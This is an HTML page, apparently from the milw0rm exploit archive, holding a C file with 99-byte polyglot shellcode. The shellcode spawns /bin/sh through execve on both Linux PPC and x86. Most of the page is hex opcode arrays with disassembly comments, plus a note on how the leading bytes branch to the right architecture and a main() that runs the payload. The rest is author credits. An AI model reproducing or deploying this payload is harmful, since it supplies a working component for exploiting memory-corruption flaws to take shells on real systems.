<html><head><title>linux/PPC/x86 execve("/bin/sh",{"/bin/sh",NULL},NULL) 99 bytes</title></head><pre>/*
 * -[ dual-linux.c ]-
 * by core@bokeoa.com (ripped from nemo@felinemenace.org)
 *                     ^-- much &lt;3 brotha ;)
 *
 * execve(&quot;/bin/sh&quot;,{&quot;/bin/sh&quot;,NULL},NULL) shellcode for linux (both the ppc
 * and x86 version.) I thought about adding mipsel but I don't feel up to it
 * at the moment.  In fact I feel like crap...
 *
 * Shoutz to nemo, andrewg, KF, ghandi, phased, MRX, Blue Boar, Solar Eclipse,
 * HDM, FX, Max Vision, MaXx, c0ntex, izik, xort, banned-it, hoglund, SkyLined,
 * Gera, Stealth (7350), Emmanuel, Hackademy, Raptor (0xdeadbeef), sh0k, jduck,
 * xfocus, LSD, ADM, b10z, 0dd, ES, runixd, packy, norse, mXn, thn, dragnet,
 * hdm, fozzy, str0ke, B|ueberry, &lt;S&gt;, rjohnson, Kaliman, capsyl, salvia,
 * amnesia, arcanum, eazyass, loophole, my family and so any others...
 * 
 * irc.pulltheplug.org #social
 *
 * peace ~ metta ~
 *
 * References:
 * http://milw0rm.com/id.php?id=1318
 * http://www.phrack.org/phrack/57/p57-0x0e
 */

char dual_linux[] =
//
// These four bytes work out to the following instruction
// in ppc arch: &quot;rlwnm   r16,r28,r29,13,4&quot;, which will
// basically do nothing on osx/ppc.
//
// However on x86 architecture the four bytes are 3
// instructions:
//
// &quot;push/nop/jmp&quot;
//
// In this way, execution will be taken to the x86 shellcode
// on an x86 machine, and the ppc shellcode when running
// on a ppc architecture machine.
//
&quot;\x5f\x90\xeb\x48&quot;

&quot;\x69\x69\x69\x69&quot;	/*nop*/
&quot;\x69\x69\x69\x69&quot;	/*nop*/
&quot;\x69\x69\x69\x69&quot;	/*nop*/
// linux/ppc execve /bin/sh by Charles Stevenson (core) &lt;core@bokeoa.com&gt;
&quot;\x7c\x3f\x0b\x78&quot;	/*mr	r31,r1 # optional instruction */
&quot;\x7c\xa5\x2a\x79&quot;	/*xor.	r5,r5,r5*/
&quot;\x42\x40\xff\xf9&quot;	/*bdzl+	10000454&lt;main&gt;*/
&quot;\x7f\x08\x02\xa6&quot;	/*mflr	r24*/
&quot;\x3b\x18\x01\x34&quot;	/*addi	r24,r24,308*/
&quot;\x98\xb8\xfe\xfb&quot;	/*stb	r5,-261(r24)*/
&quot;\x38\x78\xfe\xf4&quot;	/*addi	r3,r24,-268*/
&quot;\x90\x61\xff\xf8&quot;	/*stw	r3,-8(r1)*/
&quot;\x38\x81\xff\xf8&quot;	/*addi	r4,r1,-8*/
&quot;\x90\xa1\xff\xfc&quot;	/*stw	r5,-4(r1)*/
&quot;\x3b\xc0\x01\x60&quot;	/*li	r30,352*/
&quot;\x7f\xc0\x2e\x70&quot;	/*srawi	r0,r30,5*/
&quot;\x44\xde\xad\xf2&quot;	/*.long	0x44deadf2*/
&quot;/bin/shZ&quot; // the last byte becomes NULL

// lnx_binsh4.c - v1 - 23 Byte /bin/sh sysenter Opcode Array Payload
// Copyright(c) 2005 c0ntex &lt;c0ntex@open-security.org&gt;
// Copyright(c) 2005 BaCkSpAcE &lt;sinisa86@gmail.com&gt;
&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f&quot;
&quot;\x73\x68\x68\x2f\x62\x69\x6e\x54&quot;
&quot;\x5b\x52\x53\x54\x59\x0f\x34&quot;;

int main(int ac, char **av)
{
       void (*fp)() = dual_linux;
       fp();
}

// in loving memory of hack.co.za

// milw0rm.com [2005-11-15]</pre></html>